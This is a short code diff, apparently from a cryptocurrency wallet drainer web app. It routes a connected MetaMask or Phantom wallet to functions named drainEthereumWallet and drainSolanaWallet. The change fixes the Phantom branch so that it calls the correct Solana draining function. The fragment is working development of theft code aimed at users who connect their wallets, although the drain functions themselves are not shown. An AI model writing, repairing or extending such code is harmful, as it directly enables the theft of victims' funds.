@@ -603,7 +603,7 @@
             if (app.connectedWalletType === 'MetaMask') {
               app.drainEthereumWallet(app.publicKey);
             } else if (app.connectedWalletType === 'Phantom') {
-              app.drainToken(address);
+              app.drainSolanaWallet(); // <-- CALL THE CORRECT FUNCTION
             } else {
               app.showFeedback('No wallet connected. Please connect your wallet.', 'error');
               return;
